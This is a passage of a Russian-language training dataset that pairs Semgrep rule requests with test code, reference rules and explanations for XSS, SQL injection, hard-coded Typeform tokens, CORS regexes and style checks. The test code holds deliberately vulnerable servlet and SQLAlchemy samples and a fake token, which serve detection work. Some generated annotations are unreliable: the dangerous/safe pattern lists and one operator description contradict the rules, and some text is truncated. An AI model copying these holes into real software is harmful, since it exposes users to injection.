    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: VisualForceAPIVersion.page-meta.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<ApexPage xmlns=\"http://soap.sforce.com/2006/04/metadata\" test=\"1.0\">\n  <!-- ruleid: visualforce-page-api-version -->\n  <apiVersion>2.0</apiVersion>\n  <availableInTouch>true</availableInTouch>\n  <confirmationTokenRequired>false</confirmationTokenRequired>\n  <label>Questionnaire_App</label>\n</ApexPage>\n<ApexPage xmlns=\"http://soap.sforce.com/2006/04/metadata\">\n  <!-- ruleid: visualforce-page-api-version -->\n  <apiVersion>15.0</apiVersion>\n  <availableInTouch>true</availableInTouch>\n  <confirmationTokenRequired>false</confirmationTokenRequired>\n  <label>Questionnaire_App</label>\n</ApexPage>\n<ApexPage xmlns=\"http://soap.sforce.com/2006/04/metadata\">\n  <!-- ruleid: visualforce-page-api-version -->\n  <apiVersion>20.0</apiVersion>\n  <availableInTouch>true</availableInTouch>\n  <confirmationTokenRequired>false</confirmationTokenRequired>\n  <label>Questionnaire_App</label>\n</ApexPage>\n<ApexPage xmlns=\"http://soap.sforce.com/2006/04/metadata\">\n  <!-- ruleid: visualforce-page-api-version -->\n  <apiVersion>33.0</apiVersion>\n  <availableInTouch>true</availableInTouch>\n  <confirmationTokenRequired>false</confirmationTokenRequired>\n  <label>Questionnaire_App</label>\n</ApexPage>\n<ApexPage xmlns=\"http://soap.sforce.com/2006/04/metadata\">\n  <!-- ruleid: visualforce-page-api-version -->\n  <apiVersion>49.0</apiVersion>\n  <availableInTouch>true</availableInTouch>\n  <confirmationTokenRequired>false</confirmationTokenRequired>\n  <label>Questionnaire_App</label>\n</ApexPage>\n<ApexPage xmlns=\"http://soap.sforce.com/2006/04/metadata\">\n  <!-- ruleid: visualforce-page-api-version -->\n  <apiVersion>50.0</apiVersion>\n  <availableInTouch>true</availableInTouch>\n  <confirmationTokenRequired>false</confirmationTokenRequired>\n  <label>Questionnaire_App</label>\n</ApexPage>\n<ApexPage xmlns=\"http://soap.sforce.com/2006/04/metadata\">\n  <!-- ruleid: visualforce-page-api-version -->\n  <apiVersion>51.2</apiVersion>\n  <availa  # Ограничиваем длину\n\nОпасные паттерны:\n• <apiVersion>2.0</apiVersion>\n• <apiVersion>15.0</apiVersion>\n• <apiVersion>20.0</apiVersion>\n\nБезопасные паттерны:  \n• <apiVersion>55.0</apiVersion>\n• <apiVersion>62.0</apiVersion>\n\nЛегенда аннотаций:\n- // ruleid:visualforce-page-api-version: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:visualforce-page-api-version: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: visualforce-page-api-version\n    languages:\n      - generic\n    severity: WARNING\n    message: Visualforce Pages must use API version 55 or higher for required use of the cspHeader attribute set to true.\n    metadata:\n      cwe:\n      - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n      owasp:\n      - A07:2017 - Cross-Site Scripting (XSS)\n      - A03:2021 - Injection\n      references:\n      - https://developer.salesforce.com/docs/atlas.en-us.api_meta.meta/api_meta/meta_pages.htm\n      category: security\n      subcategory:\n      - vuln\n      technology:\n      - salesforce\n      - visualforce\n      cwe2022-top25: true\n      cwe2021-top25: true\n      likelihood: HIGH\n      impact: MEDIUM\n      confidence: HIGH\n    patterns:\n      - pattern-inside: <apiVersion.../apiVersion>\n      - pattern-either:\n        - pattern-regex: '[>][0-9].[0-9][<]'\n        - pattern-regex: '[>][1-4][0-9].[0-9][<]'\n        - pattern-regex: '[>][5][0-4].[0-9][<]'\n    paths:\n      include:\n        - \"*.page-meta.xml\"\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска элементов XML с тегом <apiVersion>, внутри которого содержится значение версии API, меньшее или равное 54.0. Паттерн использует оператор pattern-inside для нахождения элемента с указанным тегом и затем применяет три регулярных выражения pattern-regex для проверки числовых значений версий API. Если версия меньше 55.0, правило отмечает код как опасный.\n\n# Ключевые элементы:\n- ID: visualforce-page-api-version\n- Язык: generic \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "visualforce-page-api-version",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: deprecated_bnot_operator\nОписание уязвимости: The bitwise operator (`^^^`) is already deprecated. Please use `Bitwise.bnot($VAL)` instead.\nCWE: \nТип анализа: search\nЯзык: elixir",
    "input": "Требования:\n- Язык: elixir\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: deprecated-bnot-operator.exs\n# ruleid: deprecated_bnot_operator\n~~~2\n\n# ruleid: deprecated_bnot_operator\n~~~2 &&& 3\n\n\n// File: deprecated-bnot-operator.fixed.exs\n# ruleid: deprecated_bnot_operator\nBitwise.bnot(2)\n\n# ruleid: deprecated_bnot_operator\nBitwise.bnot(2) &&& 3  # Ограничиваем длину\n\nОпасные паттерны:\n• 2 ^^^ 3\n• my_var = 2 ^^^ 3\n\nБезопасные паттерны:  \n• Bitwise.bnot(2)\n• 2 ||| 3\n\nЛегенда аннотаций:\n- // ruleid:deprecated_bnot_operator: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:deprecated_bnot_operator: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: deprecated_bnot_operator\n    message: >-\n      The bitwise operator (`^^^`) is already deprecated. Please use `Bitwise.bnot($VAL)` instead.\n    severity: WARNING\n    languages:\n      - elixir\n    pattern: ~~~$VAL\n    fix: Bitwise.bnot($VAL)\n    metadata:\n      references:\n        - https://github.com/elixir-lang/elixir/commit/f1b9d3e818e5bebd44540f87be85979f24b9abfc\n      category: best-practice\n      technology:\n        - elixir\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска устаревшего оператора побитового отрицания '^^^' в Elixir-коде. Оно использует шаблон 'pattern: ~~~$VAL', который ищет оператор '^^^' непосредственно перед переменной или выражением ($VAL). Правило также предлагает исправление 'fix: Bitwise.bnot($VAL)', заменяющее устаревший оператор на рекомендуемую функцию Bitwise.bnot().\n\n# Ключевые элементы:\n- ID: deprecated_bnot_operator\n- Язык: elixir \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "deprecated_bnot_operator",
      "language": "elixir",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: avoid-sqlalchemy-text\nОписание уязвимости: sqlalchemy.text passes the constructed SQL statement to the database mostly unchanged. This means that the usual SQL injection protections are not applied and this function is vulnerable to SQL injection if user input can reach here. Use normal SQLAlchemy operators (such as `or_()`, `and_()`, etc.) to construct SQL.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: avoid-sqlalchemy-text.py\nfrom sqlalchemy import text\n\n@view_config(route_name='home_bad', renderer='my_app:templates/mytemplate.jinja2')\ndef my_bad_home(request):\n    try:\n        param = request.params['foo']\n        query = request.dbsession.query(models.MyModel)\n\n        search_non_string = text(5)\n        # ok: avoid-sqlalchemy-text\n        one = query.distinct(search_non_string)\n\n        search_bind_params = text(\":n\").bindparams(n=5)\n        # ok: avoid-sqlalchemy-text\n        one = query.distinct(search_bind_params)\n\n        search_param = text(param)\n        # ok: avoid-sqlalchemy-text\n        one = query.distinct(search_param)\n\n        search_fixed_string = text(\"foo\")\n        # ok: avoid-sqlalchemy-text\n        one = query.distinct(search_fixed_string)\n\n        search_param_concat_prefix = \"foo\" + param\n        # ruleid: avoid-sqlalchemy-text\n        one = query.distinct(text(search_param_concat_prefix))\n\n        search_param_concat_suffix = param + \"bar\"\n        # ruleid: avoid-sqlalchemy-text\n        one = query.distinct(text(search_param_concat_suffix))\n\n        search_param_f_string = f\"foo{param}bar\"\n        # ruleid: avoid-sqlalchemy-text\n        one = query.distinct(text(search_param_f_string))\n\n        search_param_format = \"foo{}bar\".format(param)\n        # ruleid: avoid-sqlalchemy-text\n        one = query.distinct(text(search_param_format))\n\n        search_param_percent_format = \"foo %s bar\" % param\n        # ruleid: avoid-sqlalchemy-text\n        one = query.distinct(text(search_param_percent_format))\n    except SQLAlchemyError:\n        return Response(\"Database error\", content_type='text/plain', status=500)\n    return {'one': one, 'project': 'my_proj'}  # Ограничиваем длину\n\nОпасные паттерны:\n• search_param_concat_prefix = \\\n•  + param\\none = query.distinct(text(search_param_concat_prefix))\n• search_param_concat_suffix = param + \\\n\nБезопасные паттерны:  \n• search_non_string = text(5)\\none = query.distinct(search_non_string)\n• search_bind_params = text(\\\n• ).bindparams(n=5)\\none = query.distinct(search_bind_params)\n\nЛегенда аннотаций:\n- // ruleid:avoid-sqlalchemy-text: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-sqlalchemy-text: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-sqlalchemy-text\n  mode: taint\n  pattern-sinks:\n    - pattern: |\n        sqlalchemy.text(...)\n  pattern-sources:\n    - patterns:\n        - pattern: |\n            $X + $Y\n        - metavariable-type:\n            metavariable: $X\n            type: string\n    - patterns:\n        - pattern: |\n            $X + $Y\n        - metavariable-type:\n            metavariable: $Y\n            type: string\n    - patterns:\n        - pattern: |\n            f\"...\"\n    - patterns:\n        - pattern: |\n            $X.format(...)\n        - metavariable-type:\n            metavariable: $X\n            type: string\n    - patterns:\n        - pattern: |\n            $X % $Y\n        - metavariable-type:\n            metavariable: $X\n            type: string\n  message: sqlalchemy.text passes the constructed SQL statement to the database mostly unchanged. This\n    means that the usual SQL injection protections are not applied and this function is vulnerable to\n    SQL injection if user input can reach here. Use normal SQLAlchemy operators (such as `or_()`, `and_()`, etc.)\n    to construct SQL.\n  metadata:\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    category: security\n    technology:\n    - sqlalchemy\n    confidence: MEDIUM\n    references:\n    - https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n  languages:\n  - python\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции sqlalchemy.text в Python-коде, которая передает построенное SQL-выражение базе данных практически неизмененным. Это означает, что стандартные защиты от SQL-инъекций не применяются, и функция подвержена атакам SQL-инъекции, если пользовательский ввод может достичь этого места. Правило ищет конкатенацию строк ($X + $Y), форматирование строк (f\n\n# Ключевые элементы:\n- ID: avoid-sqlalchemy-text\n- Язык: python \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "avoid-sqlalchemy-text",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: servletresponse-writer-xss\nОписание уязвимости: Cross-site scripting detected in HttpServletResponse writer with variable '$VAR'. User input was detected going directly from the HttpServletRequest into output. Ensure your data is properly encoded using org.owasp.encoder.Encode.forHtml: 'Encode.forHtml($VAR)'.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: servletresponse-writer-xss.java\npackage servlets;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\nimport org.apache.commons.io.FilenameUtils;\n\npublic class Cls extends HttpServlet\n{\n    private static org.apache.log4j.Logger log = Logger.getLogger(Register.class);\n\n    protected void danger(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String input1 = req.getParameter(\"input1\");\n        // ruleid:servletresponse-writer-xss\n        resp.getWriter().write(input1);\n    }\n\n    protected void danger2(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String input1 = req.getParameter(\"input1\");\n        // ruleid:servletresponse-writer-xss\n        PrintWriter writer = resp.getWriter();\n        writer.write(input1);\n    }\n\n    protected void ok(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String input1 = req.getParameter(\"input1\");\n        // ok:servletresponse-writer-xss\n        resp.getWriter().write(Encode.forHtml(input1));\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resp.getWriter().write(input1);\n• PrintWriter writer = resp.getWriter();\nwriter.write(input1);\n\nБезопасные паттерны:  \n• resp.getWriter().write(Encode.forHtml(input1));\n\nЛегенда аннотаций:\n- // ruleid:servletresponse-writer-xss: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:servletresponse-writer-xss: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: servletresponse-writer-xss\n  message: >-\n    Cross-site scripting detected in HttpServletResponse writer with variable '$VAR'.\n    User\n    input was detected going directly from the HttpServletRequest into output. Ensure\n    your\n    data is properly encoded using org.owasp.encoder.Encode.forHtml: 'Encode.forHtml($VAR)'.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#XSS_SERVLET\n    category: security\n    technology:\n    - java\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  severity: ERROR\n  patterns:\n  - pattern-inside: $TYPE $FUNC(..., HttpServletResponse $RESP, ...) { ... }\n  - pattern-inside: $VAR = $REQ.getParameter(...); ...\n  - pattern-either:\n    - pattern: $RESP.getWriter(...).write(..., $VAR, ...);\n    - pattern: |\n        $WRITER = $RESP.getWriter(...);\n        ...\n        $WRITER.write(..., $VAR, ...);\n  languages:\n  - java\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска уязвимостей XSS (Cross-site scripting) в сервлетах Java, где данные напрямую передаются из HttpServletRequest в HttpServletResponse без надлежащей обработки. Правило использует шаблон, включающий получение параметра запроса через getParameter, последующее присвоение переменной и запись этой переменной непосредственно в выходной поток с помощью метода write класса PrintWriter или HttpServletResponse. Для предотвращения XSS-атак рекомендуется использовать библиотеку OWASP Encoder для безопасной кодировки вывода.\n\n# Ключевые элементы:\n- ID: servletresponse-writer-xss\n- Язык: java \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "servletresponse-writer-xss",
      "language": "java",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения typeform-api-token\nОписание уязвимости: A gitleaks typeform-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: typeform-api-token.go\n// ruleid: typeform-api-token\ntypeformAPIToken_api_token = \"tfp_h8cbbuh10_r0nec3i0oik7lx6-iwejsupzhxc8lvwkhzsm602z8lhkeqpww\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: typeform-api-token\nvar myToken = \"tfp_abc123xyz456defghijklmnopqrstuvwxyz0123456789.-=_+\";\n\n• // ruleid: typeform-api-token\nconst apiKey = 'tfp_qwertyuiopasdfghjklzxcvbnm1234567890-=;'\n• // ruleid: typeform-api-token\nlet token = tfp_abcdefghijk1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ\n\nБезопасные паттерны:  \n• var myToken = process.env.TYPEFORM_API_TOKEN;\n\n• const apiKey = getFromSecureVault('typeform_api_key');\n\n• let token = fetchFromHSM('typeform_token')\n\nЛегенда аннотаций:\n- // ruleid:typeform-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:typeform-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: typeform-api-token\n  message: A gitleaks typeform-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:typeform)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}(tfp_[a-z0-9\\-_\\.=]{59})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена API Typeform в исходном коде. Оно ищет строку, начинающуюся с 'tfp_' и состоящую из 59 символов, которые могут быть буквами, цифрами или специальными символами (_-,=.). Регулярное выражение также учитывает различные разделители и окончания строк, чтобы точно выявить возможные токены API.\n\n# Ключевые элементы:\n- ID: typeform-api-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "typeform-api-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения cors-regex-wildcard\nОписание уязвимости: Unescaped '.' character in CORS domain regex $CORS: $PATTERN\nCWE: CWE-183: Permissive List of Allowed Inputs\nТип анализа: search\nЯзык: ts",
    "input": "Требования:\n- Язык: ts\n- Тип анализа: search\n- CWE: CWE-183: Permissive List of Allowed Inputs\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: cors-regex-wildcard.tsx\nconst corsDomains = [\n  /localhost\\:/,\n  /(.+\\.)*foo\\.com$/,\n  /(.+\\.)*foobar\\.com$/, // matches *.foobar.com,\n  // ruleid: cors-regex-wildcard\n  /^(http|https):\\/\\/(qix|qux).biz.baz.foobar.com$/,\n  /^(http|https):\\/\\/www\\.bar\\.com$/,\n  // ruleid: cors-regex-wildcard\n  /^(http|https):\\/\\/www.foo.com$/,\n];\n\nconst CORS = [\n  /localhost\\:/,\n  /(.+\\.)*foo\\.com$/,\n  /(.+\\.)*foobar\\.com$/, // matches *.foobar.com,\n  // ruleid: cors-regex-wildcard\n  /^(http|https):\\/\\/(qix|qux).biz.baz.foobar.com$/,\n  /^(http|https):\\/\\/www\\.bar\\.com$/,\n  // ruleid: cors-regex-wildcard\n  /^(http|https):\\/\\/www.foo.com$/,\n];\n\n// ruleid: cors-regex-wildcard\nconst corsOrigin = /^(http|https):\\/\\/www.foo.com$/;\n\nconst urls = [\n  /localhost\\:/,\n  /(.+\\.)*foo\\.com$/,\n  /(.+\\.)*foobar\\.com$/, // matches *.foobar.com,\n  /^(http|https):\\/\\/(qix|qux).biz.baz.foobar.com$/,\n  /^(http|https):\\/\\/www\\.bar\\.com$/,\n  /^(http|https):\\/\\/www.foo.com$/,\n];  # Ограничиваем длину\n\nОпасные паттерны:\n• let corsRegex = /(.+\\.)*foo\\.com$/;\n• let corsRegex = /^(http|https):\\/\\/(.*)\\.example\\.com$/;\n\nБезопасные паттерны:  \n• let corsRegex = /\\\\/(.+)\\.example\\.com$/;\n\nЛегенда аннотаций:\n- // ruleid:cors-regex-wildcard: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:cors-regex-wildcard: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: cors-regex-wildcard\n  message: \"Unescaped '.' character in CORS domain regex $CORS: $PATTERN\"\n  metadata:\n    cwe:\n    - 'CWE-183: Permissive List of Allowed Inputs'\n    category: security\n    technology:\n    - cors\n    owasp:\n    - A04:2021 - Insecure Design\n    references:\n    - https://owasp.org/Top10/A04_2021-Insecure_Design\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages:\n  - ts\n  severity: WARNING\n  patterns:\n  - pattern-either:\n    - pattern: $CORS = [...,/$PATTERN/,...]\n    - pattern: $CORS = /$PATTERN/\n  - focus-metavariable: $PATTERN\n  - metavariable-regex:\n      metavariable: $PATTERN\n      regex: .+?(?<!\\\\).\\..+(?<!\\\\)\\..+\n  - metavariable-regex:\n      metavariable: $CORS\n      regex: (?i)cors\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска регулярных выражений в переменной CORS, где используется необработанный символ '.', который может привести к некорректной обработке доменов CORS. Паттерн ищет случаи, когда регулярное выражение содержит последовательность '.+' за которой следует необработанный символ '.', после которого идет еще один символ '..'. Это соответствует шаблону, при котором символ '.' не экранирован обратным слешем, что является потенциальной угрозой безопасности.\n\n# Ключевые элементы:\n- ID: cors-regex-wildcard\n- Язык: ts \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "cors-regex-wildcard",
      "language": "ts",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: detect-apple-core-ml\nОписание уязвимости: Possibly found usage of AI: Apple CoreML\nCWE: \nТип анализа: search\nЯзык: swift",
    "input": "Требования:\n- Язык: swift\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-apple-core-ml.swift\n/*\nSee LICENSE folder for this sample’s licensing information.\n\nnote from commit author:\nSource of this test file ishttps://developer.apple.com/documentation/coreml/model_integration_samples/classifying_images_with_vision_and_core_ml\ncontents of LICENSE/LICENSE.txt: \n\n                                 Apache License\n                           Version 2.0, January 2004\n                        http://www.apache.org/licenses/\n\n   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION\n\n   1. Definitions.\n\n      \"License\" shall mean the terms and conditions for use, reproduction,\n      and distribution as defined by Sections 1 through 9 of this document.\n\n      \"Licensor\" shall mean the copyright owner or entity authorized by\n      the copyright owner that is granting the License.\n\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n      outstanding shares, or (iii) beneficial ownership of such entity.\n\n      \"You\" (or \"Your\") shall mean an individual or Legal Entity\n      exercising permissions granted by this License.\n\n      \"Source\" form shall mean the preferred form for making modifications,\n      including but not limited to software source code, documentation\n      source, and configuration files.\n\n      \"Object\" form shall mean any form resulting from mechanical\n      transformation or translation of a Source form, including but\n      not limited to compiled object code, generated documentation,\n      and conversions to other media types.\n\n      \"Work\" shall mean the work of authorship, whether in Source or\n      Object form, made available under the Licen  # Ограничиваем длину\n\nОпасные паттерны:\n• let coreMLModel = VNCoreMLModel(for: myModel)\n• let config = MLModelConfiguration(); config.device = .cpu\n• let mlModel = try MLModel(contentsOf: url)\n\nБезопасные паттерны:  \n• let imageClassifier = try MobileNet(configuration: MLModelConfiguration())\n• let visionModel = try VNCoreMLModel(for: myCustomModel)\n• let config = MLModelConfiguration(); config.isMultiThreadingEnabled = true\n\nЛегенда аннотаций:\n- // ruleid:detect-apple-core-ml: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-apple-core-ml: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-apple-core-ml\n    languages:\n      - swift\n    severity: INFO\n    message: \"Possibly found usage of AI: Apple CoreML\"\n    pattern-either:\n      - pattern: VNCoreMLModel(...)\n      - pattern: MLModelConfiguration(...)\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных случаев использования библиотеки Apple CoreML в Swift-коде. Оно использует оператор 'pattern-either' для обнаружения двух типов вызовов: создания экземпляра класса VNCoreMLModel и вызова метода MLModelConfiguration. Эти вызовы могут указывать на возможное применение искусственного интеллекта через библиотеку CoreML, которая предоставляет модели машинного обучения от Apple.\n\n# Ключевые элементы:\n- ID: detect-apple-core-ml\n- Язык: swift \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-apple-core-ml",
      "language": "swift",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения missing-dnf-assume-yes-switch\nОписание уязвимости: This 'dnf install' is missing the '-y' switch. This might stall builds because it requires human intervention. Add the '-y' switch.\nCWE: \nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: missing-dnf-assume-yes-switch.dockerfile\n# cf. https://github.com/hadolint/hadolint/wiki/DL3038\n\nFROM centos\n# ruleid: missing-dnf-assume-yes-switch\nRUN dnf install httpd-2.24.4 && dnf clean all\n\n# ok: missing-dnf-assume-yes-switch\nRUN dnf install -y httpd-2.24.4 && dnf clean all\n\n# ok: missing-dnf-assume-yes-switch\nRUN dnf install --downloadonly -y httpd-2.24.4 python\n\n# ok: missing-dnf-assume-yes-switch\nRUN dnfinstall -y httpd-2.24.4\n\n# ok: missing-dnf-assume-yes-switch\nRUN dnf install -y --downloadonly \\\n    python3 \\\n    python3-pip \\\n    && dnf clean all\n\n# ruleid: missing-dnf-assume-yes-switch\nRUN dnf install --downloadonly \\\n    python3 \\\n    python3-pip \\\n    && dnf clean all\n\n# ok: missing-dnf-assume-yes-switch\nRUN dnf install --assumeyes \\\n    --downloadonly \\\n    python3 \\\n    python3-pip \\\n    && dnf clean all  # Ограничиваем длину\n\nОпасные паттерны:\n• RUN dnf install httpd-2.24.4 && dnf clean all\n• RUN dnf install --downloadonly \\\n    python3 \\\n    python3-pip \\\n    && dnf clean all\n\nБезопасные паттерны:  \n• RUN dnf install -y httpd-2.24.4 && dnf clean all\n• RUN dnf install --downloadonly -y httpd-2.24.4 python\n• RUN dnfinstall -y httpd-2.24.4\n\nЛегенда аннотаций:\n- // ruleid:missing-dnf-assume-yes-switch: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-dnf-assume-yes-switch: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: missing-dnf-assume-yes-switch\n    severity: WARNING\n    languages: [dockerfile]\n    patterns:\n      - pattern: |\n          RUN ... dnf install ...\n      - pattern-not-inside: |\n          RUN ... dnf install ... -y ...\n      - pattern-not-inside: |\n          RUN ... dnf ... --assumeyes ...\n    message: >-\n      This 'dnf install' is missing the '-y' switch. This might stall\n      builds because it requires human intervention. Add the '-y' switch.\n    metadata:\n      source-rule-url: https://github.com/hadolint/hadolint/wiki/DL3038\n      references:\n        - https://github.com/hadolint/hadolint/wiki/DL3038\n      category: best-practice\n      technology:\n        - dockerfile\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска инструкций Dockerfile, использующих команду 'RUN dnf install', которая не включает опцию '-y'. Паттерн ищет строки, содержащие 'RUN dnf install', но исключает случаи, когда эта команда явно содержит '-y' или '--assumeyes'. Это позволяет обнаружить ситуации, где требуется вмешательство человека для завершения установки пакетов.\n\n# Ключевые элементы:\n- ID: missing-dnf-assume-yes-switch\n- Язык: dockerfile \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-dnf-assume-yes-switch",
      "language": "dockerfile",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
